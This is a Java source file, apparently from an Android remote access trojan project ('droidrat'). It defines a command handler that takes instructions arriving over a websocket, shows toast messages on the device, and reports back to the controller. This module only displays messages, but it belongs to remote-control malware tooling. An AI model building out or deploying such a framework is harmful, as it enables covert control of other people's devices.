package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.toast.Toastmaker;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;


public class ToastCommand extends CommandFather {

    private final Toastmaker toastmaker;

    public ToastCommand(Context context) {
        toastmaker = new Toastmaker(context);
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            String TAG = "Toast Event ";
            switch (rawCommandArray[1]) {
                case "ToastN":
                    String message = rawCommandArray[2];
                    Log.d(TAG, "Toast ToastN " + message);
                    toastmaker.makeToast(message);
                    this.send("Toast ToastN " + "->" + message);
                    break;

                case "ToastD":
                    String message1 = rawCommandArray[2];
                    String direction1 = rawCommandArray[3];
                    Log.d(TAG, "Toast ToastD:" + message1 + "\nDirection->" + direction1);
                    toastmaker.makeToast(message1, direction1);
                    this.send("Toast:ToastD:" + "->" + message1 + "\nDirection->" + direction1);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
